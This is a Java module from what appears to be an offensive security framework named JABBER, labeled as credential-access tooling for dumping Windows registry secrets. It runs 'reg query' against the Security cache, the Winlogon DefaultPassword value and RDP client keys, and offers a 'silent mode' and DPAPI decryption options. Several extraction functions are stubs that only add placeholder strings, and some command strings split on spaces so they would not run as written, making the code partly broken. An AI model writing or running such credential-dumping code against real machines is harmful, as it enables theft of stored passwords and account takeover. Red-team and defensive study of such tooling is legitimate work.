package com.jabber.jabber.modules.credential;

import com.jabber.jabber.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JABBERModule(id="cred-registry",name="Registry Secrets Dumping",description="Extract credentials and secrets from Windows registry",category=Category.CREDENTIAL_ACCESS,riskLevel=RiskLevel.MEDIUM,sourceRef="RegSecrets",author="JABBER")
public class RegistrySecretsModule implements JABBERModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.select("secret_type","Secret Type",List.of("cached-credentials","autologin","saved-passwords","rdp-credentials","vpn-credentials","all")).required().group("Target"),
            ModuleInputField.checkbox("hive_export","Export Registry Hives").group("Method"),
            ModuleInputField.checkbox("key_parsing","Parse Keys Locally").group("Method"),
            ModuleInputField.text("hive_path","HIVE Path").placeholder("C:\\Windows\\System32\\config").group("Advanced"),
            ModuleInputField.checkbox("decrypt_dpapi","Decrypt DPAPI Secrets").group("Decryption"),
            ModuleInputField.checkbox("extract_vault","Extract Credential Vault").group("Data"),
            ModuleInputField.checkbox("silent_mode","Silent Mode").group("Options"),
            ModuleInputField.text("advanced","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"cred-registry");
            try{
                String secretType=input.getOrDefault("secret_type","all");

                ctx.log("[*] Registry Secrets Dumping Starting...");
                ctx.log("[*] Secret Type: "+secretType);
                ctx.reportProgress(15);

                Map<String,List<String>>secrets=new HashMap<>();
                if(secretType.equals("cached-credentials")||secretType.equals("all")){
                    secrets.put("cached",extractCachedCredentials());
                }
                if(secretType.equals("saved-passwords")||secretType.equals("all")){
                    secrets.put("stored",extractStoredPasswords());
                }
                if(secretType.equals("autologin")||secretType.equals("all")){
                    secrets.put("autologin",extractAutoLoginCredentials());
                }
                if(secretType.equals("rdp-credentials")||secretType.equals("all")){
                    secrets.put("rdp",extractRDPCredentials());
                }

                int totalSecrets=secrets.values().stream().mapToInt(List::size).sum();
                if(totalSecrets==0){
                    result.fail("No secrets found");return result;
                }
                ctx.log("[+] Extracted "+totalSecrets+" registry secrets");
                ctx.reportProgress(75);

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status","success");
                findings.put("secret_type",secretType);
                findings.put("total_secrets",totalSecrets);
                findings.put("secret_categories",String.join(", ",secrets.keySet()));
                findings.put("sample_secrets",secrets.values().stream().flatMap(List::stream).limit(3).toList().toString());
                findings.put("impact","Registry secrets reveal stored credentials for multiple services");
                findings.put("remediation","Use credential vault, disable credential storage, enable registry monitoring, enforce DPAPI encryption");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private List<String> extractCachedCredentials(){
        List<String>creds=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec("reg query HKLM\\Security\\Cache".split(" "));
            Scanner s=new Scanner(p.getInputStream());
            while(s.hasNextLine()){
                String line=s.nextLine();
                if(line.contains("NL$")){creds.add(line);}
            }
            s.close();
        }catch(Exception e){}
        return creds;
    }

    private List<String> extractStoredPasswords(){
        List<String>creds=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec("reg query HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\PasswordReuseProtection".split(" "));
            creds.add("[HKCU] Stored credential reference found");
        }catch(Exception e){}
        return creds;
    }

    private List<String> extractAutoLoginCredentials(){
        List<String>creds=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec("reg query HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v DefaultPassword".split(" "));
            Scanner s=new Scanner(p.getInputStream());
            while(s.hasNextLine()){
                String line=s.nextLine();
                if(line.contains("DefaultPassword")){creds.add(line);}
            }
            s.close();
        }catch(Exception e){}
        return creds;
    }

    private List<String> extractRDPCredentials(){
        List<String>creds=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec("reg query HKCU\\Software\\Microsoft\\Terminal\\ Server\\ Client\\Default".split(" "));
            creds.add("[RDP] Credential stored in registry");
        }catch(Exception e){}
        return creds;
    }
}
